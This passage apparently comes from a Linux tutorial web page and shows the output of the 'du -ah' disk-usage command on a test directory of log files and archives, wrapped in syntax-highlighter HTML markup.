4.0K    test/scf/bin

32K     test/scf

4.0K    test/log2013.log

300K    test/log2012.log

0       test/log2017.log

0       test/log2016.log

4.0K    test/log30.tar.gz

4.0K    test/log.tar.bz2

4.0K    test/log.tar.gz

0       test/test3/log2014.log

4.0K    test/test3/log2013.log

8.0K    test/test3

4.0K    test/scf.tar.gz

1.3M    test

[root@localhost soft]#&lt;/textarea&gt;&lt;/div&gt;
			&lt;div class=&quot;crayon-main&quot; style=&quot;&quot;&gt;
				&lt;table class=&quot;crayon-table&quot;&gt;
					&lt;tr class=&quot;crayon-row&quot;&gt;
				&lt;td class=&quot;crayon-nums &quot; data-settings=&quot;show&quot;&gt;
					&lt;div class=&quot;crayon-nums-content&quot; style=&quot;font-size: 13px !important; line-height: 15px !important;&quot;&gt;
&lt;div class=&quot;crayon-num&quot; data-line=&quot;crayon-587aceed09798866655037-1&quot;&gt;1&lt;/div&gt;
&lt;div class=&quot;crayon-num crayon-striped-num&quot; data-line=&quot;crayon-587aceed09798866655037-2&quot;&gt;2&lt;/div&gt;
&lt;div class=&quot;crayon-num&quot; data-line=&quot;crayon-587aceed09798866655037-3&quot;&gt;3&lt;/div&gt;
&lt;div class=&quot;crayon-num crayon-striped-num&quot; data-line=&quot;crayon-587aceed09798866655037-4&quot;&gt;4&lt;/div&gt;
&lt;div class=&quot;crayon-num&quot; data-line=&quot;crayon-587aceed09798866655037-5&quot;&gt;5&lt;/div&gt;
&lt;div class=&quot;crayon-num crayon-striped-num&quot; data-line=&quot;crayon-587aceed09798866655037-6&quot;&gt;6&lt;/div&gt;
&lt;div class=&quot;crayon-num&quot; data-line=&quot;crayon-587aceed09798866655037-7&quot;&gt;7&lt;/div&gt;
&lt;div class=&quot;crayon-num crayon-striped-num&quot; data-line=&quot;crayon-587aceed09798866655037-8&quot;&gt;8&lt;/div&gt;
&lt;div class=&quot;crayon-num&quot; data-line=&quot;crayon-587aceed09798866655037-9&quot;&gt;9&lt;/div&gt;
&lt;div class=&quot;crayon-num crayon-striped-num&quot; data-line=&quot;crayon-587aceed09798866655037-10&quot;&gt;10&lt;/div&gt;
&lt;div class=&quot;crayon-num&quot; data-line=&quot;crayon-587aceed09798866655037-11&quot;&gt;11&lt;/div&gt;
&lt;div class=&quot;crayon-num crayon-striped-num&quot; data-line=&quot;crayon-587aceed09798866655037-12&quot;&gt;12&lt;/div&gt;
&lt;div class=&quot;crayon-num&quot; data-line=&quot;crayon-587aceed09798866655037-13&quot;&gt;13&lt;/div&gt;
&lt;div class=&quot;crayon-num crayon-striped-num&quot; data-line=&quot;crayon-587aceed09798866655037-14&quot;&gt;14&lt;/div&gt;
&lt;div class=&quot;crayon-num&quot; data-line=&quot;crayon-587aceed09798866655037-15&quot;&gt;15&lt;/div&gt;
&lt;div class=&quot;crayon-num crayon-striped-num&quot; data-line=&quot;crayon-587aceed09798866655037-16&quot;&gt;16&lt;/div&gt;
&lt;div class=&quot;crayon-num&quot; data-line=&quot;crayon-587aceed09798866655037-17&quot;&gt;17&lt;/div&gt;
&lt;div class=&quot;crayon-num crayon-striped-num&quot; data-line=&quot;crayon-587aceed09798866655037-18&quot;&gt;18&lt;/div&gt;
&lt;div class=&quot;crayon-num&quot; data-line=&quot;crayon-587aceed09798866655037-19&quot;&gt;19&lt;/div&gt;
&lt;div class=&quot;crayon-num crayon-striped-num&quot; data-line=&quot;crayon-587aceed09798866655037-20&quot;&gt;20&lt;/div&gt;
&lt;div class=&quot;crayon-num&quot; data-line=&quot;crayon-587aceed09798866655037-21&quot;&gt;21&lt;/div&gt;
&lt;div class=&quot;crayon-num crayon-striped-num&quot; data-line=&quot;crayon-587aceed09798866655037-22&quot;&gt;22&lt;/div&gt;
&lt;div class=&quot;crayon-num&quot; data-line=&quot;crayon-587aceed09798866655037-23&quot;&gt;23&lt;/div&gt;
&lt;div class=&quot;crayon-num crayon-striped-num&quot; data-line=&quot;crayon-587aceed09798866655037-24&quot;&gt;24&lt;/div&gt;
&lt;div class=&quot;crayon-num&quot; data-line=&quot;crayon-587aceed09798866655037-25&quot;&gt;25&lt;/div&gt;
&lt;div class=&quot;crayon-num crayon-striped-num&quot; data-line=&quot;crayon-587aceed09798866655037-26&quot;&gt;26&lt;/div&gt;
&lt;div class=&quot;crayon-num&quot; data-line=&quot;crayon-587aceed09798866655037-27&quot;&gt;27&lt;/div&gt;
&lt;div class=&quot;crayon-num crayon-striped-num&quot; data-line=&quot;crayon-587aceed09798866655037-28&quot;&gt;28&lt;/div&gt;
&lt;div class=&quot;crayon-num&quot; data-line=&quot;crayon-587aceed09798866655037-29&quot;&gt;29&lt;/div&gt;
&lt;div class=&quot;crayon-num crayon-striped-num&quot; data-line=&quot;crayon-587aceed09798866655037-30&quot;&gt;30&lt;/div&gt;
&lt;div class=&quot;crayon-num&quot; data-line=&quot;crayon-587aceed09798866655037-31&quot;&gt;31&lt;/div&gt;
&lt;div class=&quot;crayon-num crayon-striped-num&quot; data-line=&quot;crayon-587aceed09798866655037-32&quot;&gt;32&lt;/div&gt;
&lt;div class=&quot;crayon-num&quot; data-line=&quot;crayon-587aceed09798866655037-33&quot;&gt;33&lt;/div&gt;
&lt;div class=&quot;crayon-num crayon-striped-num&quot; data-line=&quot;crayon-587aceed09798866655037-34&quot;&gt;34&lt;/div&gt;
&lt;div class=&quot;crayon-num&quot; data-line=&quot;crayon-587aceed09798866655037-35&quot;&gt;35&lt;/div&gt;
&lt;div class=&quot;crayon-num crayon-striped-num&quot; data-line=&quot;crayon-587aceed09798866655037-36&quot;&gt;36&lt;/div&gt;
&lt;div class=&quot;crayon-num&quot; data-line=&quot;crayon-587aceed09798866655037-37&quot;&gt;37&lt;/div&gt;
&lt;div class=&quot;crayon-num crayon-striped-num&quot; data-line=&quot;crayon-587aceed09798866655037-38&quot;&gt;38&lt;/div&gt;
&lt;div class=&quot;crayon-num&quot; data-line=&quot;crayon-587aceed09798866655037-39&quot;&gt;39&lt;/div&gt;
&lt;div class=&quot;crayon-num crayon-striped-num&quot; data-line=&quot;crayon-587aceed09798866655037-40&quot;&gt;40&lt;/div&gt;
&lt;div class=&quot;crayon-num&quot; data-line=&quot;crayon-587aceed09798866655037-41&quot;&gt;41&lt;/div&gt;
&lt;div class=&quot;crayon-num crayon-striped-num&quot; data-line=&quot;crayon-587aceed09798866655037-42&quot;&gt;42&lt;/div&gt;
&lt;div class=&quot;crayon-num&quot; data-line=&quot;crayon-587aceed09798866655037-43&quot;&gt;43&lt;/div&gt;
&lt;div class=&quot;crayon-num crayon-striped-num&quot; data-line=&quot;crayon-587aceed09798866655037-44&quot;&gt;44&lt;/div&gt;
&lt;div class=&quot;crayon-num&quot; data-line=&quot;crayon-587aceed09798866655037-45&quot;&gt;45&lt;/div&gt;
&lt;div class=&quot;crayon-num crayon-striped-num&quot; data-line=&quot;crayon-587aceed09798866655037-46&quot;&gt;46&lt;/div&gt;
&lt;div class=&quot;crayon-num&quot; data-line=&quot;crayon-587aceed09798866655037-47&quot;&gt;47&lt;/div&gt;
&lt;div class=&quot;crayon-num crayon-striped-num&quot; data-line=&quot;crayon-587aceed09798866655037-48&quot;&gt;48&lt;/div&gt;
&lt;div class=&quot;crayon-num&quot; data-line=&quot;crayon-587aceed09798866655037-49&quot;&gt;49&lt;/div&gt;
&lt;div class=&quot;crayon-num crayon-striped-num&quot; data-line=&quot;crayon-587aceed09798866655037-50&quot;&gt;50&lt;/div&gt;
&lt;div class=&quot;crayon-num&quot; data-line=&quot;crayon-587aceed09798866655037-51&quot;&gt;51&lt;/div&gt;
&lt;div class=&quot;crayon-num crayon-striped-num&quot; data-line=&quot;crayon-587aceed09798866655037-52&quot;&gt;52&lt;/div&gt;
&lt;div class=&quot;crayon-num&quot; data-line=&quot;crayon-587aceed09798866655037-53&quot;&gt;53&lt;/div&gt;
&lt;div class=&quot;crayon-num crayon-striped-num&quot; data-line=&quot;crayon-587aceed09798866655037-54&quot;&gt;54&lt;/div&gt;
&lt;div class=&quot;crayon-num&quot; data-line=&quot;crayon-587aceed09798866655037-55&quot;&gt;55&lt;/div&gt;
&lt;div class=&quot;crayon-num crayon-striped-num&quot; data-line=&quot;crayon-587aceed09798866655037-56&quot;&gt;56&lt;/div&gt;
&lt;div class=&quot;crayon-num&quot; data-line=&quot;crayon-587aceed09798866655037-57&quot;&gt;57&lt;/div&gt;
&lt;div class=&quot;crayon-num crayon-striped-num&quot; data-line=&quot;crayon-587aceed09798866655037-58&quot;&gt;58&lt;/div&gt;
&lt;div class=&quot;crayon-num&quot; data-line=&quot;crayon-587aceed09798866655037-59&quot;&gt;59&lt;/div&gt;
&lt;div class=&quot;crayon-num crayon-striped-num&quot; data-line=&quot;crayon-587aceed09798866655037-60&quot;&gt;60&lt;/div&gt;
&lt;div class=&quot;crayon-num&quot; data-line=&quot;crayon-587aceed09798866655037-61&quot;&gt;61&lt;/div&gt;
&lt;div class=&quot;crayon-num crayon-striped-num&quot; data-line=&quot;crayon-587aceed09798866655037-62&quot;&gt;62&lt;/div&gt;
&lt;div class=&quot;crayon-num&quot; data-line=&quot;crayon-587aceed09798866655037-63&quot;&gt;63&lt;/div&gt;
&lt;div class=&quot;crayon-num crayon-striped-num&quot; data-line=&quot;crayon-587aceed09798866655037-64&quot;&gt;64&lt;/div&gt;
&lt;div class=&quot;crayon-num&quot; data-line=&quot;crayon-587aceed09798866655037-65&quot;&gt;65&lt;/div&gt;
&lt;div class=&quot;crayon-num crayon-striped-num&quot; data-line=&quot;crayon-587aceed09798866655037-66&quot;&gt;66&lt;/div&gt;
&lt;div class=&quot;crayon-num&quot; data-line=&quot;crayon-587aceed09798866655037-67&quot;&gt;67&lt;/div&gt;
&lt;div class=&quot;crayon-num crayon-striped-num&quot; data-line=&quot;crayon-587aceed09798866655037-68&quot;&gt;68&lt;/div&gt;
&lt;div class=&quot;crayon-num&quot; data-line=&quot;crayon-587aceed09798866655037-69&quot;&gt;69&lt;/div&gt;
&lt;div class=&quot;crayon-num crayon-striped-num&quot; data-line=&quot;crayon-587aceed09798866655037-70&quot;&gt;70&lt;/div&gt;
&lt;div class=&quot;crayon-num&quot; data-line=&quot;crayon-587aceed09798866655037-71&quot;&gt;71&lt;/div&gt;
&lt;div class=&quot;crayon-num crayon-striped-num&quot; data-line=&quot;crayon-587aceed09798866655037-72&quot;&gt;72&lt;/div&gt;
&lt;div class=&quot;crayon-num&quot; data-line=&quot;crayon-587aceed09798866655037-73&quot;&gt;73&lt;/div&gt;
&lt;div class=&quot;crayon-num crayon-striped-num&quot; data-line=&quot;crayon-587aceed09798866655037-74&quot;&gt;74&lt;/div&gt;
&lt;div class=&quot;crayon-num&quot; data-line=&quot;crayon-587aceed09798866655037-75&quot;&gt;75&lt;/div&gt;
&lt;/div&gt;
				&lt;/td&gt;
						&lt;td class=&quot;crayon-code&quot;&gt;&lt;div class=&quot;crayon-pre&quot; style=&quot;font-size: 13px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;&quot;&gt;
&lt;div class=&quot;crayon-line&quot; id=&quot;crayon-587aceed09798866655037-1&quot;&gt;
&lt;span class=&quot;crayon-sy&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;root&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;@&lt;/span&gt;&lt;span class=&quot;crayon-i&quot;&gt;localhost&lt;/span&gt; &lt;span class=&quot;crayon-v&quot;&gt;soft&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;]&lt;/span&gt;&lt;span class=&quot;crayon-c&quot;&gt;# du -ah test&lt;/span&gt;
&lt;/div&gt;
&lt;div class=&quot;crayon-line crayon-striped-line&quot; id=&quot;crayon-587aceed09798866655037-2&quot;&gt; &lt;/div&gt;
&lt;div class=&quot;crayon-line&quot; id=&quot;crayon-587aceed09798866655037-3&quot;&gt;
&lt;span class=&quot;crayon-cn&quot;&gt;4.0K&lt;/span&gt;    &lt;span class=&quot;crayon-r&quot;&gt;test&lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;/&lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;log31&lt;/span&gt;&lt;span class=&quot;crayon-e&quot;&gt;.tar&lt;/span&gt;&lt;span class=&quot;crayon-e&quot;&gt;.gz&lt;/span&gt;
&lt;/div&gt;
&lt;div class=&quot;crayon-line crayon-striped-line&quot; id=&quot;crayon-587aceed09798866655037-4&quot;&gt; &lt;/div&gt;
&lt;div class=&quot;crayon-line&quot; id=&quot;crayon-587aceed09798866655037-5&quot;&gt;
&lt;span class=&quot;crayon-cn&quot;&gt;4.0K&lt;/span&gt;    &lt;span class=&quot;crayon-r&quot;&gt;test&lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;/&lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;test13&lt;/span&gt;&lt;span class=&quot;crayon-e&quot;&gt;.tar&lt;/span&gt;&lt;span class=&quot;crayon-e&quot;&gt;.gz&lt;/span&gt;
&lt;/div&gt;
&lt;div class=&quot;crayon-line crayon-striped-line&quot; id=&quot;crayon-587aceed09798866655037-6&quot;&gt; &lt;/div&gt;
&lt;div class=&quot;crayon-line&quot; id=&quot;crayon-587aceed09798866655037-7&quot;&gt;
&lt;span class=&quot;crayon-cn&quot;&gt;0&lt;/span&gt;       &lt;span class=&quot;crayon-r&quot;&gt;test&lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;/&lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;linklog&lt;/span&gt;&lt;span class=&quot;crayon-e&quot;&gt;.log&lt;/span&gt;
&lt;/div&gt;
&lt;div class=&quot;crayon-line crayon-striped-line&quot; id=&quot;crayon-587aceed09798866655037-8&quot;&gt; &lt;/div&gt;
&lt;div class=&quot;crayon-line&quot; id=&quot;crayon-587aceed09798866655037-9&quot;&gt;
&lt;span class=&quot;crayon-cn&quot;&gt;0&lt;/span&gt;       &lt;span class=&quot;crayon-r&quot;&gt;test&lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;/&lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;test6&lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;/&lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;log2014&lt;/span&gt;&lt;span class=&quot;crayon-e&quot;&gt;.log&lt;/span&gt;
&lt;/div&gt;
&lt;div class=&quot;crayon-line crayon-striped-line&quot; id=&quot;crayon-587aceed09798866655037-10&quot;&gt; &lt;/div&gt;
&lt;div class=&quot;crayon-line&quot; id=&quot;crayon-587aceed09798866655037-11&quot;&gt;
&lt;span class=&quot;crayon-cn&quot;&gt;300K&lt;/span&gt;    &lt;span class=&quot;crayon-r&quot;&gt;test&lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;/&lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;test6&lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;/&lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;linklog&lt;/span&gt;&lt;span class=&quot;crayon-e&quot;&gt;.log&lt;/span&gt;
&lt;/div&gt;
&lt;div class=&quot;crayon-line crayon-striped-line&quot; id=&quot;crayon-587aceed09798866655037-12&quot;&gt; &lt;/div&gt;
&lt;div class=&quot;crayon-line&quot; id=&quot;crayon-587aceed09798866655037-13&quot;&gt;
&lt;span class=&quot;crayon-cn&quot;&gt;0&lt;/span&gt;       &lt;span class=&quot;crayon-r&quot;&gt;test&lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;/&lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;test6&lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;/&lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;log2015&lt;/span&gt;&lt;span class=&quot;crayon-e&quot;&gt;.log&lt;/span&gt;
&lt;/div&gt;
&lt;div class=&quot;crayon-line crayon-striped-line&quot; id=&quot;crayon-587aceed09798866655037-14&quot;&gt; &lt;/div&gt;
&lt;div class=&quot;crayon-line&quot; id=&quot;crayon-587aceed09798866655037-15&quot;&gt;
&lt;span class=&quot;crayon-cn&quot;&gt;4.0K&lt;/span&gt;    &lt;span class=&quot;crayon-r&quot;&gt;test&lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;/&lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;test6&lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;/&lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;log2013&lt;/span&gt;&lt;span class=&quot;crayon-e&quot;&gt;.log&lt;/span&gt;
&lt;/div&gt;
&lt;div class=&quot;crayon-line crayon-striped-line&quot; id=&quot;crayon-587aceed09798866655037-16&quot;&gt; &lt;/div&gt;
&lt;div class=&quot;crayon-line&quot; id=&quot;crayon-587aceed09798866655037-17&quot;&gt;
&lt;span class=&quot;crayon-cn&quot;&gt;300K&lt;/span&gt;    &lt;span class=&quot;crayon-r&quot;&gt;test&lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;/&lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;test6&lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;/&lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;log2012&lt;/span&gt;&lt;span class=&quot;crayon-e&quot;&gt;.log&lt;/span&gt;
&lt;/div&gt;
&lt;div class=&quot;crayon-line crayon-striped-line&quot; id=&quot;crayon-587aceed09798866655037-18&quot;&gt; &lt;/div&gt;
&lt;div class=&quot;crayon-line&quot; id=&quot;crayon-587aceed09798866655037-19&quot;&gt;
&lt;span class=&quot;crayon-cn&quot;&gt;0&lt;/span&gt;       &lt;span class=&quot;crayon-r&quot;&gt;test&lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;/&lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;test6&lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;/&lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;log2017&lt;/span&gt;&lt;span class=&quot;crayon-e&quot;&gt;.log&lt;/span&gt;
&lt;/div&gt;
&lt;div class=&quot;crayon-line crayon-striped-line&quot; id=&quot;crayon-587aceed09798866655037-20&quot;&gt; &lt;/div&gt;
&lt;div class=&quot;crayon-line&quot; id=&quot;crayon-587aceed09798866655037-21&quot;&gt;
&lt;span class=&quot;crayon-cn&quot;&gt;0&lt;/span&gt;       &lt;span class=&quot;crayon-r&quot;&gt;test&lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;/&lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;test6&lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;/&lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;log2016&lt;/span&gt;&lt;span class=&quot;crayon-e&quot;&gt;.log&lt;/span&gt;
&lt;/div&gt;
&lt;div class=&quot;crayon-line crayon-striped-line&quot; id=&quot;crayon-587aceed09798866655037-22&quot;&gt; &lt;/div&gt;
&lt;div class=&quot;crayon-line&quot; id=&quot;crayon-587aceed09798866655037-23&quot;&gt;
&lt;span class=&quot;crayon-cn&quot;&gt;608K&lt;/span&gt;    &lt;span class=&quot;crayon-r&quot;&gt;test&lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;/&lt;/span&gt;&lt;span class=&quot;crayon-i&quot;&gt;test6&lt;/span&gt;
&lt;/div&gt;
&lt;div class=&quot;crayon-line crayon-striped-line&quot; id=&quot;crayon-587aceed09798866655037-24&quot;&gt; &lt;/div&gt;
&lt;div class=&quot;crayon-line&quot; id=&quot;crayon-587aceed09798866655037-25&quot;&gt;
&lt;span class=&quot;crayon-cn&quot;&gt;0&lt;/span&gt;       &lt;span class=&quot;crayon-r&quot;&gt;test&lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;/&lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;log2015&lt;/span&gt;&lt;span class=&quot;crayon-e&quot;&gt;.log&lt;/span&gt;
&lt;/div&gt;
&lt;div class=&quot;crayon-line crayon-striped-line&quot; id=&quot;crayon-587aceed09798866655037-26&quot;&gt; &lt;/div&gt;
&lt;div class=&quot;crayon-line&quot; id=&quot;crayon-587aceed09798866655037-27&quot;&gt;
&lt;span class=&quot;crayon-cn&quot;&gt;0&lt;/span&gt;       &lt;span class=&quot;crayon-r&quot;&gt;test&lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;/&lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;test4&lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;/&lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;log2014&lt;/span&gt;&lt;span class=&quot;crayon-e&quot;&gt;.log&lt;/span&gt;
&lt;/div&gt;
&lt;div class=&quot;crayon-line crayon-striped-line&quot; id=&quot;crayon-587aceed09798866655037-28&quot;&gt; &lt;/div&gt;
&lt;div class=&quot;crayon-line&quot; id=&quot;crayon-587aceed09798866655037-29&quot;&gt;
&lt;span class=&quot;crayon-cn&quot;&gt;4.0K&lt;/span&gt;    &lt;span class=&quot;crayon-r&quot;&gt;test&lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;/&lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;test4&lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;/&lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;log2013&lt;/span&gt;&lt;span class=&quot;crayon-e&quot;&gt;.log&lt;/span&gt;
&lt;/div&gt;
&lt;div class=&quot;crayon-line crayon-striped-line&quot; id=&quot;crayon-587aceed09798866655037-30&quot;&gt; &lt;/div&gt;
&lt;div class=&quot;crayon-line&quot; id=&quot;crayon-587aceed09798866655037-31&quot;&gt;
&lt;span class=&quot;crayon-cn&quot;&gt;300K&lt;/span&gt;    &lt;span class=&quot;crayon-r&quot;&gt;test&lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;/&lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;test4&lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;/&lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;log2012&lt;/span&gt;&lt;span class=&quot;crayon-e&quot;&gt;.log&lt;/span&gt;
&lt;/div&gt;
&lt;div class=&quot;crayon-line crayon-striped-line&quot; id=&quot;crayon-587aceed09798866655037-32&quot;&gt; &lt;/div&gt;
&lt;div class=&quot;crayon-line&quot; id=&quot;crayon-587aceed09798866655037-33&quot;&gt;
&lt;span class=&quot;crayon-cn&quot;&gt;308K&lt;/span&gt;    &lt;span class=&quot;crayon-r&quot;&gt;test&lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;/&lt;/span&gt;&lt;span class=&quot;crayon-i&quot;&gt;test4&lt;/span&gt;
&lt;/div&gt;
&lt;div class=&quot;crayon-line crayon-striped-line&quot; id=&quot;crayon-587aceed09798866655037-34&quot;&gt; &lt;/div&gt;
&lt;div class=&quot;crayon-line&quot; id=&quot;crayon-587aceed09798866655037-35&quot;&gt;
&lt;span class=&quot;crayon-cn&quot;&gt;4.0K&lt;/span&gt;    &lt;span class=&quot;crayon-r&quot;&gt;test&lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;/&lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;scf&lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;/&lt;/span&gt;&lt;span class=&quot;crayon-i&quot;&gt;lib&lt;/span&gt;
&lt;/div&gt;
&lt;div class=&quot;crayon-line crayon-striped-line&quot; id=&quot;crayon-587aceed09798866655037-36&quot;&gt; &lt;/div&gt;
&lt;div class=&quot;crayon-line&quot; id=&quot;crayon-587aceed09798866655037-37&quot;&gt;
&lt;span class=&quot;crayon-cn&quot;&gt;4.0K&lt;/span&gt;    &lt;span class=&quot;crayon-r&quot;&gt;test&lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;/&lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;scf&lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;/&lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;service&lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;/&lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;deploy&lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;/&lt;/span&gt;&lt;span class=&quot;crayon-i&quot;&gt;product&lt;/span&gt;
&lt;/div&gt;
&lt;div class=&quot;crayon-line crayon-striped-line&quot; id=&quot;crayon-587aceed09798866655037-38&quot;&gt; &lt;/div&gt;
&lt;div class=&quot;crayon-line&quot; id=&quot;crayon-587aceed09798866655037-39&quot;&gt;
&lt;span class=&quot;crayon-cn&quot;&gt;4.0K&lt;/span&gt;    &lt;span class=&quot;crayon-r&quot;&gt;test&lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;/&lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;scf&lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;/&lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;service&lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;/&lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;deploy&lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;/&lt;/span&gt;&lt;span class=&quot;crayon-i&quot;&gt;info&lt;/span&gt;
&lt;/div&gt;
&lt;div class=&quot;crayon-line crayon-striped-line&quot; id=&quot;crayon-587aceed09798866655037-40&quot;&gt; &lt;/div&gt;
&lt;div class=&quot;crayon-line&quot; id=&quot;crayon-587aceed09798866655037-41&quot;&gt;
&lt;span class=&quot;crayon-cn&quot;&gt;12K&lt;/span&gt;     &lt;span class=&quot;crayon-r&quot;&gt;test&lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;/&lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;scf&lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;/&lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;service&lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;/&lt;/span&gt;&lt;span class=&quot;crayon-i&quot;&gt;deploy&lt;/span&gt;
&lt;/div&gt;
&lt;div class=&quot;crayon-line crayon-striped-line&quot; id=&quot;crayon-587aceed09798866655037-42&quot;&gt; &lt;/div&gt;
&lt;div class=&quot;crayon-line&quot; id=&quot;crayon-587aceed09798866655037-43&quot;&gt;
&lt;span class=&quot;crayon-cn&quot;&gt;16K&lt;/span&gt;     &lt;span class=&quot;crayon-r&quot;&gt;test&lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;/&lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;scf&lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;/&lt;/span&gt;&lt;span class=&quot;crayon-i&quot;&gt;service&lt;/span&gt;
&lt;/div&gt;
&lt;div class=&quot;crayon-line crayon-striped-line&quot; id=&quot;crayon-587aceed09798866655037-44&quot;&gt; &lt;/div&gt;
&lt;div class=&quot;crayon-line&quot; id=&quot;crayon-587aceed09798866655037-45&quot;&gt;
&lt;span class=&quot;crayon-cn&quot;&gt;4.0K&lt;/span&gt;    &lt;span class=&quot;crayon-r&quot;&gt;test&lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;/&lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;scf&lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;/&lt;/span&gt;&lt;span class=&quot;crayon-i&quot;&gt;doc&lt;/span&gt;
&lt;/div&gt;
&lt;div class=&quot;crayon-line crayon-striped-line&quot; id=&quot;crayon-587aceed09798866655037-46&quot;&gt; &lt;/div&gt;
&lt;div class=&quot;crayon-line&quot; id=&quot;crayon-587aceed09798866655037-47&quot;&gt;
&lt;span class=&quot;crayon-cn&quot;&gt;4.0K&lt;/span&gt;    &lt;span class=&quot;crayon-r&quot;&gt;test&lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;/&lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;scf&lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;/&lt;/span&gt;&lt;span class=&quot;crayon-i&quot;&gt;bin&lt;/span&gt;
&lt;/div&gt;
&lt;div class=&quot;crayon-line crayon-striped-line&quot; id=&quot;crayon-587aceed09798866655037-48&quot;&gt; &lt;/div&gt;
&lt;div class=&quot;crayon-line&quot; id=&quot;crayon-587aceed09798866655037-49&quot;&gt;
&lt;span class=&quot;crayon-cn&quot;&gt;32K&lt;/span&gt;     &lt;span class=&quot;crayon-r&quot;&gt;test&lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;/&lt;/span&gt;&lt;span class=&quot;crayon-i&quot;&gt;scf&lt;/span&gt;
&lt;/div&gt;
&lt;div class=&quot;crayon-line crayon-striped-line&quot; id=&quot;crayon-587aceed09798866655037-50&quot;&gt; &lt;/div&gt;
&lt;div class=&quot;crayon-line&quot; id=&quot;crayon-587aceed09798866655037-51&quot;&gt;
&lt;span class=&quot;crayon-cn&quot;&gt;4.0K&lt;/span&gt;    &lt;span class=&quot;crayon-r&quot;&gt;test&lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;/&lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;log2013&lt;/span&gt;&lt;span class=&quot;crayon-e&quot;&gt;.log&lt;/span&gt;
&lt;/div&gt;
&lt;div class=&quot;crayon-line crayon-striped-line&quot; id=&quot;crayon-587aceed09798866655037-52&quot;&gt; &lt;/div&gt;
